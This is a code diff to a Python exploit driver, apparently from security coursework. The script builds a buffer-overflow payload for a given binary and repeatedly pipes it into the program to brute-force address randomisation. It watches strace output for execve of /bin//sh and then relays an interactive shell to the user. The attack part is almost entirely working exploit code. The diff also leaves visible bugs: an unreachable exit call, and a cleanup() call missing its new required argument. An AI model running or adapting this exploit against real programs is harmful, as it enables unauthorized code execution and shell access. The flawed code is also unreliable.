@@ -14,8 +14,14 @@ log_file_path = 'strace.log'
 
 
 
-def cleanup():
+def cleanup(exit_code: int):
+
+    os.remove("trash")
+    os.remove("vuln_payload")
+    os.remove("strace.log")
     sys.exit(1)
+    sys.exit(exit_code)
+
 
 def stack_middle_address(output):
 
@@ -133,6 +139,21 @@ def construct_payload(offset, vuln):
 
     open("vuln_payload", "wb").write(payload)
 
+def drain_fd(fd: int):
+    try:
+        while True:
+            rlist, _, _ = select.select([fd], [], [], 0.1)
+            if not rlist:
+                break     #drained all trash content
+            
+            try:
+                os.read(fd, 10000)
+            except OSError:
+                break
+    except Exception as e:
+        print(f"An error occurred while draining the buffer: {e}")
+        cleanup()
+
 def attach_strace():
     main_pid = os.getpid()
     strace_command = f"strace -f -e execve -p {str(main_pid)} -o strace.log"
@@ -145,11 +166,7 @@ def attach_strace():
             stderr=devnull
         )
     
-
-
 def detect_crash(pid: int):
-
-    # ppid_str = str(os.getpid())
     pid_str = str(pid)
 
     # pattern to detect the SIGCHLD signal with a SIGSEGV e.g. SIGCHLD {si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=15595, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=3}
@@ -176,9 +193,8 @@ def detect_crash(pid: int):
     return False
 
 def detect_execve():
-
     pattern = re.compile(
-        r"execve\(\"/bin//sh\".*\) = 0"
+        r"\d+\s+execve\(\"/bin//sh\", NULL, NULL\)\s+=\s+0"
     )
 
     try:
@@ -186,9 +202,6 @@ def detect_execve():
             lines = log_file.readlines()
 
             for line in lines:
-                # print(f"{GREEN}{line}{RESET}")
-                print(line)
-
                 if pattern.search(line):
                     return True
 
@@ -202,6 +215,7 @@ def detect_execve():
     return False
 
 
+
 def main():
         
     if len(sys.argv) != 2:
@@ -210,22 +224,17 @@ def main():
 
     vuln = sys.argv[1]
 
-    #this program has PIE enabled -> compilation option that changes the location of the executable in every run. PIE does not work locally
-
+    #this program has PIE enabled -> compilation option that changes the location of the executable in every run
 
     ra_offset = locate_ra(generate_test())
     construct_payload(ra_offset, vuln)
     attach_strace()
 
-    print(f"{GREEN}main proc pid: {os.getpid()}{RESET}")
-
-
-
     #performing brute force attack
     exploit_command = f"cat vuln_payload - | ./{vuln} " + " ".join(["`cat trash`"] * 15)
     i = 0
     while True:
-        print(f"{PINK}i: {i}{RESET}")
+        # print(f"{PINK}i: {i}{RESET}")
         i += 1
 
         master_fd, slave_fd = pty.openpty()
@@ -239,32 +248,14 @@ def main():
         )
         os.write(master_fd, b'\n')
 
-        print(f"\033[94mexploit proc pid: {exploit_proc.pid}\033[0m")
+        # print(f"\033[94mexploit proc pid: {exploit_proc.pid}\033[0m")
     
         while True:
 
-            rlist, _, _ = select.select([master_fd, 0], [], [])
+            if detect_execve():
+                #successful exploit, in shell
+                drain_fd(master_fd)
 
-            if master_fd in rlist:                
-                try:
-                    output = os.read(master_fd, 100000)
-                    if output:
-                        # if b'Segmentation fault' in output:           #must change, must retrieve the exit code of the process (139)
-
-                        if detect_crash(exploit_proc.pid) or i == 1:    #must find the bug related to the first run and the missing logs!
-                            with open(log_file_path, 'w') as log_file:
-                                log_file.truncate(0)                    #empty the log file from the logs of the previous attempts to minimize the load of the linear search
-                            break
-                        elif detect_execve():
-                            print(f"{PINK}Something happened here or what?!{RESET}")
-                            cleanup()
-                    else:
-                        break
-                except OSError:
-                    break
-
-            if 0 in rlist:
-                #exploit took place successfully
                 while True:
                     os.write(1, b'# ')
                     user_input = os.read(0, 5000)
@@ -273,10 +264,8 @@ def main():
                             exploit_proc.terminate()
                             os.close(master_fd)
                             os.close(slave_fd)
-                            os.remove("trash")
-                            os.remove("vuln_payload")
-                            # os.remove("strace.log")
-                            sys.exit(1)
+                            cleanup(0)
+
                     
                     os.write(master_fd, user_input)  # Forward user input to the exploit shell
                     rlist_response, _, _ = select.select([master_fd], [], [], 0.1)
@@ -291,8 +280,22 @@ def main():
                         rlist_response, _, _ = select.select([master_fd], [], [], 0.1)
 
 
+            rlist, _, _ = select.select([master_fd], [], [], 0.1)
 
-        # Close the PTY file descriptors
+            if master_fd in rlist:                
+                try:
+                    output = os.read(master_fd, 100000)
+                    if output:
+                        if detect_crash(exploit_proc.pid) or i == 1:    #must find the bug related to the first run and the missing logs!
+                            with open(log_file_path, 'w') as log_file:
+                                log_file.truncate(0)                    #empty the log file from the logs of the previous attempts to minimize the load of the linear search
+                                log_file.seek(0)
+                            break
+                    else:
+                        break
+                except OSError:
+                    break
+
         os.close(master_fd)
         os.close(slave_fd)
             
@@ -300,47 +303,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
-# while True:
-# rlist, _, _ = select.select([master_fd, 0], [], [])
-
-# if master_fd in rlist:
-#     try:
-#         output = os.read(master_fd, 100000)
-#         if output:
-#             # os.write(1, output)  # Write the process output to stdout (1)
-#             if b'Segmentation fault' in output:           #must change, must retrieve the exit code of the process (139)
-#                 exploit_proc.terminate()
-#                 break
-#         else:
-#             break  # Process has exited
-#     except OSError:
-#         break
-
-# if 0 in rlist:
-#     #exploit took place successfully
-#     while True:
-#         os.write(1, b'# ')
-#         user_input = os.read(0, 5000)
-        
-#         if b'exit' in user_input:
-#                 exploit_proc.terminate()
-#                 os.close(master_fd)
-#                 os.close(slave_fd)
-#                 os.remove("trash")
-#                 os.remove("vuln_payload")
-#                 # os.remove("strace.log")
-#                 sys.exit(1)
-        
-#         os.write(master_fd, user_input)  # Forward user input to the exploit shell
-#         rlist_response, _, _ = select.select([master_fd], [], [], 0.1)
-
-#         while master_fd in rlist_response:
-#             response = os.read(master_fd, 1024)
-#             response = response.replace(b'\r', b'')
-#             if response != user_input:
-#                 os.write(1, response)
-#                 break
-
-#             rlist_response, _, _ = select.select([master_fd], [], [], 0.1)
